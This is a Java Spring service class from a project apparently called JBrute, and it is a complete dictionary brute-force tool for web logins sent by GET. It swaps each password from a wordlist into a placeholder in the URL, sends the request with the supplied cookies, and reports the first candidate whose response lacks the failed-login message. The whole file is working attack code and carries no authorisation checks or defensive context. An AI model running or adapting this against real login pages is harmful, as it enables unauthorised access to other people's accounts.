package com.francescodisalesgithub.JBrute.service;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpHeaders;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map.Entry;
import java.util.Scanner;

import javax.servlet.http.Cookie;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpMethod;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import com.francescodisalesgithub.JBrute.model.BruteGetModel;

@Service
public class BruteService 
{
	 Logger logger = LoggerFactory.getLogger(BruteService.class);

	
	public LinkedHashMap<String,String> bruteGetRequest(BruteGetModel bruteGetModel)
	{
		LinkedHashMap<String,String> credentials = new LinkedHashMap<String,String>();
		
			try 
			{
				
				StringBuilder urlGet = new StringBuilder();
				
				urlGet.append(bruteGetModel.getUrl()+"?");
				int i=0;
				
				for(Entry<String, String> value : bruteGetModel.getQueryParameters().entrySet())
				{
					if(i==0)
						urlGet.append(value.getKey()+"="+value.getValue());
					else
						urlGet.append("&"+value.getKey()+"="+value.getValue());
					
					i++;
				}
				
				
				org.springframework.http.HttpHeaders headers = new org.springframework.http.HttpHeaders();
				headers.add("Cookie", bruteGetModel.getCookies());
				HttpEntity<String> entity = new HttpEntity<String>("",headers);
				
				Scanner fileBruteForce = new Scanner(new File(bruteGetModel.getDictionaryPath()));
				
				
				
				while(fileBruteForce.hasNext())
				{
					StringBuilder passwordurl = new StringBuilder(urlGet);
					String localpassword = fileBruteForce.next();
					String password = passwordurl.toString().replace("target",localpassword);
					
					URI uri = new URI(password);
				
					
					
					RestTemplate javaClient = new RestTemplate();
					ResponseEntity<String> response = javaClient.exchange(uri, HttpMethod.GET, entity, String.class);
					
					
					if(!response.getBody().contains(bruteGetModel.getWrongMessageLogin()))
					{
						logger.info("username: "+bruteGetModel.getUser()+" password: "+localpassword+" [OK]");
						
						credentials.put("username",bruteGetModel.getUser());
						credentials.put("password",localpassword);
						return credentials;
					}
					else
						logger.info("username: "+bruteGetModel.getUser()+" password: "+localpassword+" [KO]");
					
					
					
				}
				
				fileBruteForce.close();
				
				credentials.put("message","brute force failed!");
				return credentials;
				
			} 
			catch (URISyntaxException e) 
			{
			
				credentials.put("error", "wrong uri inserted");
				return credentials;
			}
			catch (FileNotFoundException e) 
			{
				
				credentials.put("error", "file not found");
				return credentials;
			}
			catch (IOException e) 
			{

				credentials.put("error", "something happened while doing the http request: "+e.getMessage());
				return credentials;

			} 
			
			
	
		
	}

}
